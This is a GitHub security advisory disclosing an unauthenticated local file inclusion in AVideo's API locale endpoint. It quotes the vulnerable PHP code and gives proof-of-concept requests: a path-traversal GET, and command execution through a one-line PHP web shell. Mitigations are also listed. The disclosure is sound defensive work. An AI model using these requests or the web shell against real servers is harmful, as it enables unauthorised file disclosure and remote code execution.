# [H] AVideo has an Unauthenticated Local File Inclusion in API locale (RCE possible with writable PHP)

## Summary
Severity: High
Advisory: GHSA-8fw8-q79c-fp9m
CVE: CVE-2026-33513
CWE: CWE-22, CWE-98
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-8fw8-q79c-fp9m
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
### Summary
An unauthenticated API endpoint (`APIName=locale`) concatenates user input into an `include` path with no canonicalization or whitelist. Path traversal is accepted, so arbitrary PHP files under the web root can be included. In our test this yielded confirmed file disclosure and code execution of existing PHP content (e.g., `view/about.php`), and it *can* escalate to RCE if an attacker can place or control a PHP file elsewhere in the tree. 
### Details
- Entry point: `plugin/API/get.json.php` sets `$global['bypassSameDomainCheck']=1` and merges GET/POST/JSON into `$parameters` without authentication or API secret.
- Handler: `plugin/API/API.php`, method `get_api_locale()` (lines ~5009–5023):
  ```php
  $parameters['language'] = strtolower($parameters['language']);
  $file = "{$global['systemRootPath']}locale/{$parameters['language']}.php";
  if (!file_exists($file)) { return new ApiObject("This language does not exists"); }
  include $file;
  ```
  No validation is performed; `../` traversal is accepted.
- Because `include` executes PHP, any reachable PHP file is executed in the web server context.

### PoC
1. Fetch an arbitrary PHP file (no auth):
   ```
   GET /plugin/API/get.json.php?APIName=locale&language=../view/about HTTP/1.1
   Host: <target>
   ```
   Response returns the rendered About page HTML, proving traversal outside `locale/`.
2. RCE with an attacker PHP file (any writable PHP path):
   ```
   GET /plugin/API/get.json.php?APIName=locale&language=../videos/locale/shell&x=whoami
   ```
   If `shell.php` contains `<?php system($_GET['x']); ?>`, the response includes command output.

### Impact
- Unauthenticated file inclusion of arbitrary PHP files under the web root.
- Confidential data leakage (e.g., configuration, secrets) via included PHP that renders output.
- Potential RCE *if* any attacker-writable PHP file exists elsewhere (not confirmed in this build).
- Affects any deployment with the API plugin enabled (default in docker-compose).

### Mitigation
- Reject path separators/dots and enforce a strict allowlist of locale slugs.
- `realpath` the target and ensure it stays within `$systemRootPath/locale`.
- Stop using `include` for translations; load data from vetted formats (JSON/array).
- Add authentication (API secret/token) to the endpoint as a secondary control.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-8fw8-q79c-fp9m
- https://nvd.nist.gov/vuln/detail/CVE-2026-33513
- https://github.com/WWBN/AVideo
